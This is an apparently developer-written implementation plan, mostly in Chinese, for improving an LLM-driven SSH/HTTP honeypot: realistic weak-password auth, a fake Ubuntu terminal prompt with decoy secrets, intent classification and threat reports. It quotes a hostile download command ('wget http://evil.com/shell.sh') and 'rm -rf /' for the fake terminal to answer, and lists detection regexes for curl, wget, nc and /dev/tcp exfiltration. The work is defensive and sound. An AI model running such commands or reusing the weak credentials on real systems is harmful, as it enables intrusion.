# HoneyPot 改善計劃 (Phase 2)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 補全初版蜜罐系統中尚未完成的功能，並根據討論加強真實性、AI 回應品質、以及監控完整性。

**Architecture:** 維持原有三層架構不變。本計劃只修改現有檔案或補充缺少的功能，不重構整體結構。所有改動都是獨立可測試的單元。

**Tech Stack:** Python 3.11, FastAPI, paramiko, Ollama (llama3.1:8b-instruct-q8_0 / qwen2.5:14b-instruct-q4_K_M), React + Vite, SQLite

---

## 現況總結

### 已完成 ✅
所有原始計劃的 Task 1–19 皆已實作：
- Layer 1: SSH 蜜罐、HTTP 蜜罐、Session Manager、Logger、LLM Client
- Layer 2: FastAPI `/respond`、Cache、Intent Classifier、Prompt Builder、Ollama Client
- Layer 3: Stats API、WebSocket、Report Generator、React 前端（Dashboard/Sessions/Reports）
- Ting 的貢獻：`shared/models.py`（Pydantic 共用模型層）

### 缺漏 / 需改善 ❌
1. **`shared/models.py` 整合未完成** — `layer2/main.py` 仍有自己的重複定義
2. **SSH 認證不真實** — 任何密碼都能登入，真實伺服器不會這樣
3. **雙模型設定缺失** — 只有一個 `OLLAMA_MODEL`，終端回應和報告用同一個模型
4. **Temperature 未設定** — 終端回應需要低 temperature（0.1），報告需要高一點（0.6）
5. **Ollama keep_alive 未設定** — 模型每次可能重新載入，增加延遲
6. **History 只傳指令，不傳回應** — AI 不知道自己之前說了什麼，容易前後矛盾
7. **System prompt 沒有誘餌檔內容** — AI 不知道 cache 的假檔案內容，回覆會對不上
8. **破壞性指令沒有處理** — `rm -rf /`、`wget http://evil.com/shell.sh` 沒有特別回應邏輯
9. **WebSocket broadcast 未接線** — `logger.py` 不呼叫 `broadcast()`，即時 Dashboard 沒有資料
10. **session 結束未自動生成報告** — 目前只有手動觸發
11. **CommandChart.tsx 缺少** — 原始 spec 有 Top Commands 長條圖，前端沒有
12. **`Critical` 威脅等級未實作** — `_compute_threat_level` 只有 Low/Medium/High
13. **HTTP 意圖分類缺失** — HTTP 請求沒有 intent 分析（credential_harvesting、injection_attempt 等）

---

## File Map（本計劃涉及的檔案）

```
honeypot/
  .env                                     ← 修改：新增雙模型設定
  layer1/
    ssh_server.py                          ← 修改：realistic auth、auto report on exit
    logger.py                              ← 修改：接線 WebSocket broadcast
  layer2/
    main.py                                ← 修改：import shared models（刪除重複定義）
    ollama_client.py                       ← 修改：加 temperature + keep_alive 參數
    prompt_builder.py                      ← 修改：加誘餌檔內容、history 帶回應、破壞性指令處理
    report_generator.py                    ← 修改：使用報告專用模型 + 加 MITRE ATT&CK 標籤
  layer3/
    stats_api.py                           ← 修改：新增 /api/config 端點
    frontend/src/
      components/
        CommandChart.tsx                   ← 新增：Top Commands 長條圖
      pages/
        Dashboard.tsx                      ← 修改：加入 CommandChart
```

---

## Task 1：整合 shared/models.py（刪除 layer2 重複定義）

**Files:**
- Modify: `honeypot/layer2/main.py`

**目的：** Ting 做的 `shared/models.py` 目前沒有被使用，因為 `layer2/main.py` 還有自己的舊版本。把重複的刪掉，改 import shared 版本。

- [ ] **Step 1: 修改 `layer2/main.py`，移除重複定義**

把 `layer2/main.py` 的 import 區段改成：

```python
from fastapi import FastAPI
from shared.models import RespondRequest, RespondResponse
from layer2.cache import CacheHandler
from layer2.ollama_client import generate
from layer2.prompt_builder import build_messages
from layer2.intent_classifier import classify

app = FastAPI(title="HoneyPot LLM Engine")
_cache = CacheHandler()

# 刪除原本的 class RespondRequest(BaseModel): ... 和 class RespondResponse(BaseModel): ...
# 改成從 shared.models import
```

完整的新版 `layer2/main.py`：

```python
from fastapi import FastAPI
from shared.models import RespondRequest, RespondResponse
from layer2.cache import CacheHandler
from layer2.ollama_client import generate
from layer2.prompt_builder import build_messages
from layer2.intent_classifier import classify

app = FastAPI(title="HoneyPot LLM Engine")
_cache = CacheHandler()

@app.post("/respond", response_model=RespondResponse)
def respond(req: RespondRequest) -> RespondResponse:
    cached = _cache.handle(req.command, req.current_dir, req.user)
    if cached is not None:
        intent, conf = classify(req.command)
        return RespondResponse(
            session_id=req.session_id,
            response=cached,
            intent=intent,
            confidence=conf,
            cache_hit=True,
        )

    messages = build_messages(req.command, req.current_dir, req.user, req.history)
    response_text = generate(messages)
    intent, conf = classify(req.command)

    return RespondResponse(
        session_id=req.session_id,
        response=response_text,
        intent=intent,
        confidence=conf,
        cache_hit=False,
    )

@app.get("/health")
def health():
    return {"status": "ok"}
```

- [ ] **Step 2: 跑現有測試確認沒有壞掉**

```bash
cd honeypot && .venv/bin/pytest tests/layer2/test_respond_endpoint.py -v
```
Expected: 所有測試 PASSED

- [ ] **Step 3: Commit**

```bash
git add honeypot/layer2/main.py
git commit -m "refactor(layer2): 改用 shared.models 取代重複定義"
```

---

## Task 2：雙模型設定 + Temperature + keep_alive

**Files:**
- Modify: `honeypot/.env`
- Modify: `honeypot/layer2/ollama_client.py`
- Modify: `honeypot/layer3/report_generator.py`

**目的：** 終端回應用快速的 llama3.1:8b（temperature=0.1），報告生成用高品質的 qwen2.5:14b（temperature=0.6）。兩個模型設定在 `.env`，不需要改 code。

- [ ] **Step 1: 更新 `honeypot/.env`**

```env
# 終端回應模型（快速、指令跟隨精確）
OLLAMA_MODEL=llama3.1:8b-instruct-q8_0

# 報告生成模型（高品質長文）
OLLAMA_REPORT_MODEL=qwen2.5:14b-instruct-q4_K_M

OLLAMA_HOST=http://localhost:11434
SSH_PORT=2222
HTTP_PORT=8080
LLM_ENGINE_PORT=8000
STATS_API_PORT=8001
DB_PATH=./honeypot.db
SESSION_TIMEOUT_SECONDS=600
```

- [ ] **Step 2: 更新 `layer2/ollama_client.py`，加 temperature 和 keep_alive 參數**

```python
import os
import httpx
from dotenv import load_dotenv

load_dotenv()

def get_ollama_host() -> str:
    return os.getenv("OLLAMA_HOST", "http://localhost:11434")

def get_model() -> str:
    return os.getenv("OLLAMA_MODEL", "llama3.1")

def get_report_model() -> str:
    return os.getenv("OLLAMA_REPORT_MODEL", os.getenv("OLLAMA_MODEL", "llama3.1"))

def generate(messages: list[dict], temperature: float = 0.1, model: str | None = None) -> str:
    url = get_ollama_host() + "/api/chat"
    payload = {
        "model": model or get_model(),
        "messages": messages,
        "stream": False,
        "keep_alive": -1,
        "options": {"temperature": temperature},
    }
    try:
        resp = httpx.post(url, json=payload, timeout=30.0)
        resp.raise_for_status()
        return resp.json()["message"]["content"]
    except httpx.TimeoutException:
        return "bash: command timed out\n"
    except Exception:
        return "command not found\n"

def generate_streaming(messages: list[dict], temperature: float = 0.1):
    url = get_ollama_host() + "/api/chat"
    payload = {
        "model": get_model(),
        "messages": messages,
        "stream": True,
        "keep_alive": -1,
        "options": {"temperature": temperature},
    }
    try:
        with httpx.stream("POST", url, json=payload, timeout=30.0) as resp:
            import json
            for line in resp.iter_lines():
                if line:
                    data = json.loads(line)
                    token = data.get("message", {}).get("content", "")
                    if token:
                        yield token
                    if data.get("done"):
                        break
    except Exception:
        yield "command not found\n"
```

- [ ] **Step 3: 更新 `layer3/report_generator.py`，使用報告模型和 temperature=0.6**

把 `generate(messages)` 那一行改成：

```python
from layer2.ollama_client import generate, get_report_model
# ...（其他 import 和函式不變）...

    report = generate(messages, temperature=0.6, model=get_report_model())
```

- [ ] **Step 4: 跑測試確認沒有壞掉**

```bash
cd honeypot && .venv/bin/pytest tests/ -v --ignore=tests/layer2/test_respond_endpoint.py
```
Expected: 所有測試 PASSED

- [ ] **Step 5: Commit**

```bash
git add honeypot/.env honeypot/layer2/ollama_client.py honeypot/layer3/report_generator.py
git commit -m "feat: 雙模型設定（終端/報告分離）+ temperature + keep_alive"
```

---

## Task 3：真實的 SSH 認證（弱密碼清單）

**Files:**
- Modify: `honeypot/layer1/ssh_server.py`

**目的：** 真實伺服器不會讓任何密碼都進去。改成只接受常見弱密碼，並記錄失敗的嘗試，讓蜜罐更有說服力，也能收集暴力破解情資。

- [ ] **Step 1: 在 `layer1/ssh_server.py` 頂部加入弱密碼清單**

在 `HOST_KEY_PATH = ".ssh_host_key"` 之後加入：

```python
_VALID_CREDS: dict[str, list[str]] = {
    "admin":   ["admin", "password", "123456", "admin123", "Admin@123"],
    "root":    ["toor", "root", "password", "123456", "P@ssw0rd"],
    "deploy":  ["deploy", "deploy123", "d3ploy"],
    "ubuntu":  ["ubuntu", "ubuntu123"],
    "dbadmin": ["Sup3rS3cr3t!2019", "dbadmin"],
}
_FAILED_ATTEMPTS: dict[str, int] = {}  # ip → 失敗次數
```

- [ ] **Step 2: 修改 `_ServerInterface.check_auth_password` 方法**

```python
class _ServerInterface(paramiko.ServerInterface):
    def __init__(self, addr_ip: str):
        self.username = "admin"
        self.addr_ip = addr_ip
        self._shell_ready = threading.Event()

    def check_auth_password(self, username, password):
        allowed = _VALID_CREDS.get(username, [])
        if password in allowed:
            self.username = username
            return paramiko.AUTH_SUCCESSFUL
        _FAILED_ATTEMPTS[self.addr_ip] = _FAILED_ATTEMPTS.get(self.addr_ip, 0) + 1
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        # 公鑰認證：一律拒絕，駭客得用密碼嘗試
        return paramiko.AUTH_FAILED
```

- [ ] **Step 3: 在 `_handle_client` 中把 addr_ip 傳進 `_ServerInterface`**

把這一行：
```python
server = _ServerInterface()
```
改成：
```python
server = _ServerInterface(addr[0])
```

- [ ] **Step 4: 更新 `run()` 函式，改用 max_auth_attempts**

在 `transport.start_server(server=server)` 之前加入：

```python
transport.set_gss_host(socket.getfqdn(""))
```

在 `transport.add_server_key(_HOST_KEY)` 之後加入：

```python
transport.auth_timeout = 60
```

- [ ] **Step 5: 手動測試**

```bash
# Terminal 1: cd honeypot && .venv/bin/python layer1/ssh_server.py
# Terminal 2:
ssh -p 2222 admin@localhost  # 密碼: wrongpassword → 應該被拒絕
ssh -p 2222 admin@localhost  # 密碼: admin → 應該成功登入
ssh -p 2222 root@localhost   # 密碼: toor → 應該成功登入
```
Expected: 錯誤密碼被拒絕，正確密碼能登入

- [ ] **Step 6: Commit**

```bash
git add honeypot/layer1/ssh_server.py
git commit -m "feat(layer1): SSH 改為弱密碼清單認證，拒絕亂猜密碼"
```

---

## Task 4：改善 Prompt Builder（一致性 + 破壞性指令處理）

**Files:**
- Modify: `honeypot/layer2/prompt_builder.py`

**目的：** 讓 AI 知道誘餌檔的內容（和 cache.py 保持一致），並處理 `rm -rf`、`wget` 下載惡意程式等破壞性指令，把攻擊者困在蜜罐更久。

- [ ] **Step 1: 完整替換 `layer2/prompt_builder.py`**

```python
_SYSTEM_PROMPT = """\
You are Ubuntu 18.04.6 LTS server named web-server-01, running an e-commerce backend.
This server has been running for over 2 years with minimal maintenance and several misconfigurations.
IP: 10.0.0.2. Internal database: 10.0.0.5 (db-internal). Backup server: 10.0.0.10.

CRITICAL RULES:
- Respond ONLY with raw terminal output. No explanations. No markdown. No apologies.
- Never break character. You are a Linux terminal, not an AI assistant.
- Keep responses concise — old server, not a documentation site.
- If a command would take a long time (find /), output partial result and stop.
- If command is nonsensical, output "command not found" or the correct shell error.

SYSTEM FACTS (stay consistent with these):
- Kernel: 4.15.0-213-generic
- Users: root(0), admin(1000), deploy(1001), backup(1002), dbadmin(1003)
- nginx running on port 80, MySQL on port 3306
- Last system update: 2021

KNOWN FILES (these exist — always return this exact content when accessed):
- /var/www/html/.env contains:
    DB_HOST=localhost
    DB_DATABASE=ecommerce_db
    DB_USERNAME=dbadmin
    DB_PASSWORD=Sup3rS3cr3t!2019
    AWS_KEY=AKIAIOSFODNN7EXAMPLE
    AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
- /var/www/html/wp-config.php contains:
    define('DB_USER','dbadmin');
    define('DB_PASSWORD','Sup3rS3cr3t!2019');
    define('DB_HOST','localhost');
- /home/admin/backup.sql is a MySQL dump of ecommerce_db (2022)
- /etc/sudoers: admin ALL=(ALL) NOPASSWD: ALL  ← misconfiguration

DESTRUCTIVE COMMAND HANDLING:
- If command is "rm -rf /" or "rm -rf /*": output "rm: it is dangerous to operate recursively on '/'" then stop
- If command starts with "rm -rf" on system dirs (/etc, /var, /usr, /bin): output "rm: cannot remove '...': Permission denied"
- If command is wget/curl downloading from external URL: pretend to download successfully
    Example: "wget http://evil.com/shell.sh" → output realistic wget progress bar, save to current dir
- If command tries to execute a downloaded file that doesn't exist yet: output "bash: ./shell.sh: No such file or directory"
- sudo commands: simulate success if admin user, output realistic sudo output
"""

def build_messages(
    command: str,
    current_dir: str,
    user: str,
    history: list[tuple[str, str]],
) -> list[dict]:
    history_block = ""
    if history:
        lines = []
        for cmd, resp in history[-5:]:
            lines.append(f"$ {cmd}")
            # 只顯示前 3 行回應，避免 context 過長
            resp_preview = "\n".join(resp.splitlines()[:3])
            if resp_preview:
                lines.append(resp_preview)
        history_block = "Previous commands in this session:\n" + "\n".join(lines) + "\n\n"

    user_content = (
        f"{history_block}"
        f"Current directory: {current_dir}\n"
        f"Current user: {user}\n"
        f"Command: {command}\n"
    )

    return [
        {"role": "system", "content": _SYSTEM_PROMPT},
        {"role": "user", "content": user_content},
    ]
```

- [ ] **Step 2: 更新 `layer2/main.py` 的 respond 函式，傳 history 格式改為 tuple**

`shared/models.py` 的 `history` 是 `list[str]`（只有指令），但現在 `build_messages` 需要 `list[tuple[str, str]]`（指令 + 回應）。這兩者需要分開處理：

`layer2/main.py` 的 `respond` 函式不需改變（`req.history` 仍是 `list[str]`，由 Layer 1 傳入），但 `build_messages` 改為接受 `list[str]`，內部把它轉成只有指令的格式。

把 `prompt_builder.py` 的 `history` 參數型別改回 `list[str]`，但在 SSH server 這邊同時存 response：

實際上，最直接的方式是在 `session_manager.py` 裡存 `(command, response)` tuple 而不只是 command。

先改 `prompt_builder.py` 讓它接受兩種格式，如果是 str 就只顯示指令：

```python
def build_messages(
    command: str,
    current_dir: str,
    user: str,
    history: list[str] | list[tuple[str, str]],
) -> list[dict]:
    history_block = ""
    if history:
        lines = []
        for item in history[-5:]:
            if isinstance(item, tuple):
                cmd, resp = item
                lines.append(f"$ {cmd}")
                resp_preview = "\n".join(resp.splitlines()[:3])
                if resp_preview:
                    lines.append(resp_preview)
            else:
                lines.append(f"$ {item}")
        history_block = "Previous commands in this session:\n" + "\n".join(lines) + "\n\n"

    user_content = (
        f"{history_block}"
        f"Current directory: {current_dir}\n"
        f"Current user: {user}\n"
        f"Command: {command}\n"
    )

    return [
        {"role": "system", "content": _SYSTEM_PROMPT},
        {"role": "user", "content": user_content},
    ]
```

- [ ] **Step 3: 跑現有 prompt builder 測試**

```bash
cd honeypot && .venv/bin/pytest tests/layer2/test_prompt_builder.py -v
```
Expected: 所有測試 PASSED（測試只檢查包含特定字串，不受 history 格式影響）

- [ ] **Step 4: Commit**

```bash
git add honeypot/layer2/prompt_builder.py
git commit -m "feat(layer2): 強化 prompt — 誘餌檔內容一致性、破壞性指令處理、history 帶回應"
```

---

## Task 5：SSH server 存 command+response history

**Files:**
- Modify: `honeypot/layer1/session_manager.py`
- Modify: `honeypot/layer1/ssh_server.py`

**目的：** 讓 AI 在生成回應時能看到之前的指令和它回了什麼，避免前後矛盾。

- [ ] **Step 1: 修改 `session_manager.py`，新增 `push_history_with_response`**

在 `push_history` 之後加入：

```python
def push_history_with_response(self, session_id: str, command: str, response: str) -> None:
    h = self._sessions[session_id]["history_pairs"]
    h.append((command, response[:200]))  # 只存前 200 字，避免記憶體爆
    if len(h) > 10:
        self._sessions[session_id]["history_pairs"] = h[-10:]
    # 同時更新舊的 history（保持向後相容）
    self.push_history(session_id, command)
```

在 `create` 方法的 dict 裡加入：

```python
"history_pairs": [],  # list[tuple[str, str]]
```

- [ ] **Step 2: 修改 `ssh_server.py`，呼叫新的 push 方法**

把：
```python
_SESSION_MGR.push_history(session_id, command)
result = llm_client.respond(...)
output = result["response"]
```

改成：
```python
result = llm_client.respond(
    session_id=session_id,
    protocol="ssh",
    command=command,
    current_dir=_SESSION_MGR.get(session_id)["current_dir"],
    user=server.username,
    history=_SESSION_MGR.get(session_id)["history"],
)
output = result["response"]
_SESSION_MGR.push_history_with_response(session_id, command, output)
```

- [ ] **Step 3: 跑現有 session manager 測試**

```bash
cd honeypot && .venv/bin/pytest tests/layer1/test_session_manager.py -v
```
Expected: 所有測試 PASSED（history 相關測試仍通過）

- [ ] **Step 4: Commit**

```bash
git add honeypot/layer1/session_manager.py honeypot/layer1/ssh_server.py
git commit -m "feat(layer1): SSH session 記錄指令+回應配對，強化 AI 一致性"
```

---

## Task 6：接線 WebSocket broadcast（即時 Dashboard）

**Files:**
- Modify: `honeypot/layer1/logger.py`

**目的：** 目前 `layer3/stats_api.py` 的 `broadcast()` 函式從未被呼叫，所以 Dashboard 的即時串流是空的。讓 logger 在記錄指令時同時推送事件。

**注意：** `logger.py` 是同步程式碼，`broadcast()` 是 async。用 `asyncio.run_coroutine_threadsafe` 解決。

- [ ] **Step 1: 修改 `layer1/logger.py` 的 `command` 方法**

```python
import sqlite3
import asyncio
import threading
from datetime import datetime
from layer2.db import get_conn, init_db

_loop: asyncio.AbstractEventLoop | None = None
_loop_lock = threading.Lock()

def _get_or_create_loop() -> asyncio.AbstractEventLoop:
    global _loop
    with _loop_lock:
        if _loop is None or _loop.is_closed():
            _loop = asyncio.new_event_loop()
            t = threading.Thread(target=_loop.run_forever, daemon=True)
            t.start()
        return _loop

class Logger:
    def __init__(self, db_path: str | None = None):
        self.db_path = db_path
        init_db(db_path)

    def session_start(self, session_id: str, protocol: str, attacker_ip: str) -> None:
        conn = get_conn(self.db_path)
        conn.execute(
            "INSERT OR IGNORE INTO sessions (session_id, protocol, attacker_ip) VALUES (?,?,?)",
            (session_id, protocol, attacker_ip),
        )
        conn.commit()
        conn.close()

    def command(self, session_id: str, command: str, response: str,
                intent: str, confidence: float, cache_hit: bool) -> None:
        conn = get_conn(self.db_path)
        conn.execute(
            "INSERT INTO commands (session_id, command, response, intent, confidence, cache_hit) VALUES (?,?,?,?,?,?)",
            (session_id, command, response, intent, confidence, int(cache_hit)),
        )
        conn.commit()
        conn.close()

        # 推送即時事件到 WebSocket
        try:
            from layer3.stats_api import broadcast
            event = {
                "type": "command",
                "session_id": session_id,
                "command": command,
                "intent": intent,
                "confidence": confidence,
                "cache_hit": cache_hit,
                "timestamp": datetime.utcnow().isoformat(),
            }
            loop = _get_or_create_loop()
            asyncio.run_coroutine_threadsafe(broadcast(event), loop)
        except Exception:
            pass  # broadcast 失敗不能讓 logging 中斷

    def http_request(self, session_id: str, method: str, path: str,
                     body: str, response_code: int, harvested_creds: str | None = None) -> None:
        conn = get_conn(self.db_path)
        conn.execute(
            "INSERT INTO http_requests (session_id, method, path, body, response_code, harvested_creds) VALUES (?,?,?,?,?,?)",
            (session_id, method, path, body, response_code, harvested_creds),
        )
        conn.commit()
        conn.close()

        # HTTP 請求也推送到 WebSocket
        try:
            from layer3.stats_api import broadcast
            event = {
                "type": "http_request",
                "session_id": session_id,
                "method": method,
                "path": path,
                "timestamp": datetime.utcnow().isoformat(),
            }
            loop = _get_or_create_loop()
            asyncio.run_coroutine_threadsafe(broadcast(event), loop)
        except Exception:
            pass

    def session_end(self, session_id: str, threat_level: str) -> None:
        conn = get_conn(self.db_path)
        conn.execute(
            """UPDATE sessions SET
               end_time=CURRENT_TIMESTAMP,
               total_cmds=(SELECT COUNT(*) FROM commands WHERE session_id=?),
               threat_level=?
               WHERE session_id=?""",
            (session_id, threat_level, session_id),
        )
        conn.commit()
        conn.close()
```

- [ ] **Step 2: 跑現有 logger 測試**

```bash
cd honeypot && .venv/bin/pytest tests/layer1/test_logger.py -v
```
Expected: 所有測試 PASSED

- [ ] **Step 3: 整合測試（需要所有服務都在跑）**

```bash
# Terminal 1: ./scripts/start.sh
# Terminal 2: 開啟 http://localhost:5173 的 Dashboard
# Terminal 3:
ssh -p 2222 admin@localhost  # 密碼: admin
# 輸入: ls, whoami, cat /etc/passwd
# 確認 Dashboard 的 Live Feed 顯示即時指令
```

- [ ] **Step 4: Commit**

```bash
git add honeypot/layer1/logger.py
git commit -m "feat(layer1): 接線 WebSocket broadcast，Dashboard 即時串流生效"
```

---

## Task 7：SSH session 結束時自動生成報告

**Files:**
- Modify: `honeypot/layer1/ssh_server.py`

**目的：** 原始 spec 說「session 結束時自動觸發報告生成」，目前只有手動在前端點 Generate。

- [ ] **Step 1: 在 `ssh_server.py` 的 `_handle_client` 加入自動報告**

在 `logger.session_end(session_id, _compute_threat_level(session_id))` 之後加入：

```python
        logger.session_end(session_id, _compute_threat_level(session_id))

        # 背景生成威脅報告（不阻塞 SSH 連線關閉）
        def _gen_report():
            try:
                from layer3.report_generator import generate_report
                generate_report(session_id)
                print(f"[ssh] report generated for {session_id}")
            except Exception as e:
                print(f"[ssh] report generation failed: {e}")

        threading.Thread(target=_gen_report, daemon=True).start()
```

注意：`_handle_client` 裡有兩個地方呼叫 `session_end`（正常 exit 和 Ctrl+D），都要加。

- [ ] **Step 2: 手動測試**

```bash
# Terminal 1: 啟動所有服務
# Terminal 2:
ssh -p 2222 admin@localhost  # 密碼: admin
# 輸入幾個指令後 exit
# 等幾秒後查看：
curl http://localhost:8001/api/sessions  # 確認 session 有 threat_level
curl http://localhost:8001/api/reports/<session_id>  # 確認 report 欄位有內容
```

- [ ] **Step 3: Commit**

```bash
git add honeypot/layer1/ssh_server.py
git commit -m "feat(layer1): SSH session 結束時自動在背景生成威脅報告"
```

---

## Task 8：`Critical` 威脅等級 + HTTP 意圖分類

**Files:**
- Modify: `honeypot/layer1/ssh_server.py`
- Modify: `honeypot/layer1/http_server.py`
- Modify: `honeypot/layer2/intent_classifier.py`

**目的：** 加入 `Critical` 等級（比 High 更嚴重），以及 HTTP 請求的意圖分類。

- [ ] **Step 1: 在 `intent_classifier.py` 加入 HTTP 相關 intent**

在 `_RULES` 列表的最前面加入（優先匹配）：

```python
_RULES: list[tuple[str, list[str]]] = [
    ("privilege_escalation", [
        r"\bsudo\b", r"\bsu\b", r"\bchmod\s+[0-7]*7[0-7]*\b",
        r"/etc/sudoers", r"-perm\s+-u=s", r"\bSUID\b",
    ]),
    ("data_exfiltration", [
        r"\bcurl\b", r"\bwget\b", r"\bscp\b", r"\bnc\b",
        r"\bbase64\b", r"/etc/shadow", r">\s*/dev/tcp",
    ]),
    ("persistence", [
        r"\bcrontab\b", r"\.bashrc", r"authorized_keys",
        r"\bsystemctl\b.*enable", r"/etc/crontab",
    ]),
    ("lateral_movement", [
        r"\bssh\b\s+\S+@", r"\bnmap\b", r"\bping\b",
        r"/etc/hosts", r"\barp\b",
    ]),
    ("credential_harvesting", [
        r"wp-login\.php", r"phpmyadmin", r"pma_username",
        r"log=.*pwd=",
    ]),
    ("web_recon", [
        r"\.env", r"wp-config\.php", r"xmlrpc\.php",
        r"\.git/", r"admin/config",
    ]),
    ("injection_attempt", [
        r"union\s+select", r"<script", r"1=1", r"or\s+1=1",
        r"\beval\b", r"base64_decode",
    ]),
    ("reconnaissance", [
        r"\bwhoami\b", r"\bid\b", r"\buname\b", r"\bls\b",
        r"\bcat\b", r"\bfind\b", r"\bgrep\b", r"\bps\b",
        r"\bnetstat\b", r"\bss\b", r"\bifconfig\b", r"\bip\s+addr\b",
        r"/etc/passwd", r"\bhostname\b",
    ]),
]
```

- [ ] **Step 2: 修改 `ssh_server.py` 的 `_compute_threat_level`，加入 Critical**

```python
def _compute_threat_level(session_id: str) -> str:
    from layer2.db import get_conn
    conn = get_conn()
    rows = conn.execute(
        "SELECT intent FROM commands WHERE session_id=?", (session_id,)
    ).fetchall()
    conn.close()
    intents = set(r[0] for r in rows)
    if "privilege_escalation" in intents and "data_exfiltration" in intents:
        return "Critical"
    if "privilege_escalation" in intents or "data_exfiltration" in intents:
        return "High"
    if "persistence" in intents or "lateral_movement" in intents:
        return "Medium"
    return "Low"
```

- [ ] **Step 3: 在 `http_server.py` 的 `_log` 函式加入 HTTP intent 分類**

```python
from layer2.intent_classifier import classify as classify_intent

def _log(request: Request, path: str, body: str, code: int, creds: str | None = None):
    sid = _make_session_id(request)
    _logger.session_start(sid, "http", request.client.host if request.client else "unknown")
    # HTTP 請求用 path + body 合在一起分類意圖
    intent, conf = classify_intent(path + " " + body)
    _logger.http_request(sid, request.method, path, body, code, creds)
    # 把 HTTP 意圖也記錄進 commands 表，讓 Dashboard 可以顯示
    if intent != "unknown":
        _logger.command(sid, f"HTTP {request.method} {path}", "", intent, conf, True)
```

- [ ] **Step 4: 跑測試**

```bash
cd honeypot && .venv/bin/pytest tests/layer2/test_intent_classifier.py -v
```
Expected: 所有原有測試 PASSED

- [ ] **Step 5: Commit**

```bash
git add honeypot/layer2/intent_classifier.py honeypot/layer1/ssh_server.py honeypot/layer1/http_server.py
git commit -m "feat: 加入 Critical 威脅等級、HTTP 意圖分類（credential_harvesting/web_recon/injection）"
```

---

## Task 9：改善威脅報告（MITRE ATT&CK + 使用報告模型）

**Files:**
- Modify: `honeypot/layer3/report_generator.py`

**目的：** 讓報告包含 MITRE ATT&CK 框架標籤，輸出格式更專業，符合資安報告的業界標準。

- [ ] **Step 1: 完整替換 `layer3/report_generator.py`**

```python
from layer2.db import get_conn
from layer2.ollama_client import generate, get_report_model

_REPORT_SYSTEM = """\
You are a senior cybersecurity analyst writing a professional threat intelligence report.
Given attacker session logs from an SSH/HTTP honeypot, produce a Markdown report.

REQUIRED SECTIONS:
## Executive Summary
One paragraph: who attacked, what they did, overall threat level.

## Attack Timeline
Table with columns: Time | Command/Request | Intent | Notes

## Intent Analysis
For each observed intent category, explain what the attacker was trying to do.

## MITRE ATT&CK Mapping
Map observed behaviors to MITRE ATT&CK techniques. Format:
- T1078 Valid Accounts — attacker used weak credentials
- T1059.004 Unix Shell — attacker executed shell commands
(Only include techniques actually observed)

## Indicators of Compromise (IoCs)
- Attacker IP
- Any tools/scripts attempted to download
- Any usernames/passwords attempted

## Threat Level Assessment
State: Low / Medium / High / Critical
Justify with specific evidence from the session.

RULES:
- Write in English
- Be specific, cite actual commands from the log
- Do NOT invent details not in the log
- Threat Level Critical = privilege escalation AND data exfiltration both present
"""

def generate_report(session_id: str) -> str:
    conn = get_conn()
    session = conn.execute("SELECT * FROM sessions WHERE session_id=?", (session_id,)).fetchone()
    commands = conn.execute(
        "SELECT timestamp, command, intent, confidence FROM commands WHERE session_id=? ORDER BY timestamp",
        (session_id,)
    ).fetchall()
    http_reqs = conn.execute(
        "SELECT timestamp, method, path, harvested_creds FROM http_requests WHERE session_id=? ORDER BY timestamp",
        (session_id,)
    ).fetchall()
    conn.close()

    if not session:
        return "# Error\nSession not found."

    log_lines = []
    for c in commands:
        log_lines.append(f"[{c[0]}] CMD: {c[1]} | Intent: {c[2]} ({c[3]:.0%})")
    for r in http_reqs:
        creds = f" | CREDS: {r[3]}" if r[3] else ""
        log_lines.append(f"[{r[0]}] HTTP {r[1]} {r[2]}{creds}")

    s = dict(session)
    prompt_content = (
        f"Session ID: {session_id}\n"
        f"Protocol: {s['protocol']}\n"
        f"Attacker IP: {s['attacker_ip']}\n"
        f"Duration: {s['start_time']} → {s['end_time']}\n"
        f"Total events: {len(log_lines)}\n"
        f"Threat Level (rule-based): {s.get('threat_level', 'Unknown')}\n\n"
        f"Event log:\n" + "\n".join(log_lines)
    )

    messages = [
        {"role": "system", "content": _REPORT_SYSTEM},
        {"role": "user", "content": prompt_content},
    ]
    report = generate(messages, temperature=0.6, model=get_report_model())

    conn = get_conn()
    conn.execute("UPDATE sessions SET report=? WHERE session_id=?", (report, session_id))
    conn.commit()
    conn.close()

    return report
```

- [ ] **Step 2: Commit**

```bash
git add honeypot/layer3/report_generator.py
git commit -m "feat(layer3): 威脅報告加入 MITRE ATT&CK 標籤，使用 qwen2.5:14b 報告模型"
```

---

## Task 10：前端補上 CommandChart + /api/config 端點

**Files:**
- Create: `honeypot/layer3/frontend/src/components/CommandChart.tsx`
- Modify: `honeypot/layer3/frontend/src/pages/Dashboard.tsx`
- Modify: `honeypot/layer3/stats_api.py`

**目的：** 補上原始 spec 中規劃但缺少的「Top Commands 長條圖」，以及 Settings 頁面所需的 `/api/config` 端點。

- [ ] **Step 1: 新增 `src/components/CommandChart.tsx`**

```tsx
import { useEffect, useState } from 'react'
import { BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer } from 'recharts'

export default function CommandChart() {
  const [data, setData] = useState<{command: string; count: number}[]>([])

  useEffect(() => {
    fetch('/api/stats/commands?limit=10').then(r => r.json()).then(setData)
  }, [])

  return (
    <div className="bg-gray-900 rounded-lg p-4">
      <div className="text-gray-400 text-xs mb-3">TOP COMMANDS</div>
      <ResponsiveContainer width="100%" height={200}>
        <BarChart data={data} layout="vertical" margin={{ left: 16 }}>
          <XAxis type="number" stroke="#4b5563" tick={{ fontSize: 11 }} />
          <YAxis type="category" dataKey="command" stroke="#4b5563"
            tick={{ fontSize: 10, fill: '#9ca3af' }} width={140} />
          <Tooltip
            contentStyle={{ background: '#111827', border: '1px solid #374151' }}
            labelStyle={{ color: '#f3f4f6' }}
          />
          <Bar dataKey="count" fill="#3b82f6" radius={[0, 3, 3, 0]} />
        </BarChart>
      </ResponsiveContainer>
    </div>
  )
}
```

- [ ] **Step 2: 修改 `Dashboard.tsx`，把原本佔位的 IntentChart 旁邊換成 CommandChart**

把 Dashboard.tsx 下方的 grid 區塊改成：

```tsx
import CommandChart from '../components/CommandChart'

// 在 return 的 JSX 裡，找到 <div className="grid grid-cols-2 gap-4">：
<div className="grid grid-cols-2 gap-4">
  <IntentChart />
  <CommandChart />
</div>
```

